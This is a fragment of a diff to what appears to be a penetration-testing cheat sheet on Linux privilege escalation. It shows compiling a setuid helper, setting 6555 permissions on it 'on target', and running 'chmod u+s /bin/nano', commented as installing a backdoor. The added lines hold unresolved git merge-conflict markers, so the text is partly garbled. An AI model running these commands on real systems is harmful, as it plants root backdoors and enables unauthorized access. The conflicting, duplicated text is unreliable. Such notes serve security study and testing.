@@ -1191,12 +1191,17 @@ gcc -m32 -o setuid setuid.c #32bit
 Errors in compilation?
 apt install gcc-multilib
 
+<<<<<<< HEAD
 **Transfer setuid to the target and get it 6555 permissions**
 [On_Target] chmod 6555 setuid
 
 Example: https://www.youtube.com/watch?v=9MeBiP637ZA
 
 #Others
+=======
+Example: https://www.youtube.com/watch?v=9MeBiP637ZA
+
+>>>>>>> 0c54566c4c730593c58008f170042b083f2a79b6
 ls -al /bin/nano       #    -rwxr-xr-x 1 root root 191976 2010-02-01 20:30 /bin/nano
 chmod u+s /bin/nano    # installs the backdoor
 </pre>
